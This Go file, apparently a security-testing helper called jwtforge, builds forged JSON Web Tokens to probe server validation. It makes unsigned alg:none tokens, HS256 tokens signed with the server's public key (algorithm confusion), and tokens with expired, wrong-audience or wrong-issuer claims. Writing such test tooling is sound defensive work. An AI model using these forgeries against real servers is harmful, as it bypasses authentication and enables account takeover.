package jwtforge

import (
	"crypto/hmac"
	"crypto/sha256"
	"encoding/base64"
	"encoding/json"
)

func b64URL(b []byte) string {
	return base64.RawURLEncoding.EncodeToString(b)
}

func encodeHeader(alg string) string {
	h, _ := json.Marshal(map[string]string{"alg": alg, "typ": "JWT"})
	return b64URL(h)
}

func encodePayload(claims map[string]any) string {
	p, _ := json.Marshal(claims)
	return b64URL(p)
}

// merge returns a new map with all keys from base, overwritten by any keys in overlay.
func merge(base, overlay map[string]any) map[string]any {
	out := make(map[string]any, len(base)+len(overlay))
	for k, v := range base {
		out[k] = v
	}
	for k, v := range overlay {
		out[k] = v
	}
	return out
}

// CraftUnsigned produces a JWT with alg:none and an empty signature segment.
// A server that accepts this token performs no signature verification at all.
func CraftUnsigned(claims map[string]any) string {
	return encodeHeader("none") + "." + encodePayload(claims) + "."
}

// CraftAlgConfusion re-signs claims as HS256 using the raw PEM-encoded public key
// bytes as the HMAC secret. This exploits libraries that trust the alg field in the
// token header rather than enforcing a server-side expected algorithm, allowing an
// attacker to sign tokens with the server's own public key material.
func CraftAlgConfusion(pubKeyPEM string, claims map[string]any) string {
	h := encodeHeader("HS256")
	p := encodePayload(claims)
	input := h + "." + p
	mac := hmac.New(sha256.New, []byte(pubKeyPEM))
	mac.Write([]byte(input)) //nolint:errcheck // hmac.Write never fails
	return input + "." + b64URL(mac.Sum(nil))
}

// CraftExpired produces a JWT whose exp and iat are both anchored to the year 2000.
// A server that accepts this token is not enforcing token expiration, meaning stolen
// tokens remain valid indefinitely.
func CraftExpired(claims map[string]any) string {
	overlay := map[string]any{
		"iat": 946684800, // 2000-01-01T00:00:00Z
		"exp": 946688400, // 2000-01-01T01:00:00Z - 1 hour later, still in the past
	}
	merged := merge(claims, overlay)
	return encodeHeader("none") + "." + encodePayload(merged) + "."
}

// CraftAudienceMismatched produces a JWT with the given audience claim.
// A server that accepts this token is not validating the intended audience,
// allowing tokens issued for one service to be replayed against another.
func CraftAudienceMismatched(aud string, claims map[string]any) string {
	merged := merge(claims, map[string]any{"aud": aud})
	return encodeHeader("none") + "." + encodePayload(merged) + "."
}

// CraftIssuerMismatched produces a JWT with the given issuer claim.
// A server that accepts this token is not validating the token issuer, allowing
// tokens crafted by a rogue IdP to be accepted as legitimate.
func CraftIssuerMismatched(iss string, claims map[string]any) string {
	merged := merge(claims, map[string]any{"iss": iss})
	return encodeHeader("none") + "." + encodePayload(merged) + "."
}
